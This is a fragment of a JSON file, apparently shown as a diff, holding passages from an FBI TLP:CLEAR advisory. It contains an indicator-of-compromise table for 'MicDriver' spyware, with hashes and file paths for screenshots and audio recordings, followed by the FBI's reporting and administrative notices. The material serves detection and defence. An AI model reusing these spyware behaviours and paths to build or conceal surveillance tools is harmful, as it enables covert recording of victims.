+  "text": "MicDriver\n                        Indicator                                  Type                  Relevance\n                     8c00489632ccefdac3612329fe5b5491        MD5 Hash         MicDriver.zip MD5 hash\n       C:\\ProgramData\\ZlibDate\\CachedFiles\\MicDriver.zip     File Path        MicDriver.zip archive path\n                    d70ebf20e3d697897bad5bebf72ea271         MD5 Hash         MicDriver.exe MD5 hash\n           C:\\ProgramData\\Drivers\\MicDriver\\MicDriver.exe    File Path        MicDriver.exe path\n            C:\\ProgramData\\Drivers\\MicDriver\\MicDriver.dll   File Path        MicDriver.dll path\n                     f8b5554808428291acc65d1fd2efe01c        MD5 Hash         MicDriver.dll hash\n  1.0.0+3569b73188ca0a5255cc5b68d6b765b02421aeb80            ProductVersion   MicDriver.dll Product Version\n    C:\\ProgramData\\ZlibDate\\Z84A847FEEB1FC2s\\Records         Folder           MicDriver.dll audio recordings\n                                                                              folder\n                 C:\\ProgramData\\Drivers\\MicDriver\\_*.jpeg    File Path Mask   MicDriver.dll screenshot file\n                                                                              path mask\n            C:\\ProgramData\\Drivers\\MicDriver\\_*_mic.wav      File Path Mask   MicDriver.dll audio recordings\n                                                                              file path mask\n             C:\\ProgramData\\Drivers\\MicDriver\\_*_spk.wav     File Path Mask   MicDriver.dll audio recordings\n                                                                              file path mask\n            C:\\ProgramData\\Drivers\\MicDriver\\Cache\\ZP_*      File Path Mask   MicDriver.dll compressed and\n                                                                              encrypted audio recordings file\n                                                                              path mask\n                  88022704ffb1264a6587e6e1b0759600           MD5 Hash         MDll.dll MD5 hash\n     C:\\ProgramData\\Drivers\\MicDriver\\Resources\\MDll.dll     File Path        MDll.dll path"
+ },
+ {
+  "id": "p186",
+  "text": "Reporting Notice\nIf you identify suspicious activity within your enterprise or have information related to the contents of this\ndocument, please contact your local FBI Cyber Squad immediately at www.fbi.gov/contact-us/field-\noffices. The FBI also encourages you to report suspicious or criminal activity to the FBI Internet Crime\nComplaint Center at www.ic3.gov. When available, each report should include the date, time, location,\ntype of activity, number of people, and type of equipment used for the activity, the name of the submitting\ncompany or organization, and a designated point of contact. Press inquiries should be directed to the FBI’s\nNational Press Office at npo@fbi.gov or (202) 324-3691."
+ },
+ {
+  "id": "p187",
+  "text": "Individual indicators included in this document should always be evaluated in light of your complete\ninformation security situation. Some indicators, particularly those of a nondeterministic or ephemeral\nnature (such as filenames or IP addresses), may not be indicative of a compromise."
+ },
+ {
+  "id": "p188",
+  "text": "Your organization has no obligation to provide information in response to this product. If, after reviewing\nthe information provided, your organization decides to provide information to the FBI, it must do so\nconsistent with applicable state and federal law."
+ },
+ {
+  "id": "p189",
+  "text": "Administrative Note\nThe information in this document is being provided by the FBI, with no guarantees or warranties, for\npotential use at the sole discretion of recipients to protect against cyber threats. This data is provided to\nhelp cybersecurity professionals and system administrators guard against the persistent malicious actions\nof cyber actors. The FBI does not endorse any commercial entity, product, company, or service, including\nany entities, products, or services linked within this document. Any reference to specific commercial\nentities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does\nnot constitute or imply endorsement, recommendation, or favoring by the FBI."
+ },
+ {
+  "id": "p190",
+  "text": "This product is marked TLP:CLEAR. The information in this product may be shared without restriction.\nInformation is subject to standard copyright rules."
+ }
+]
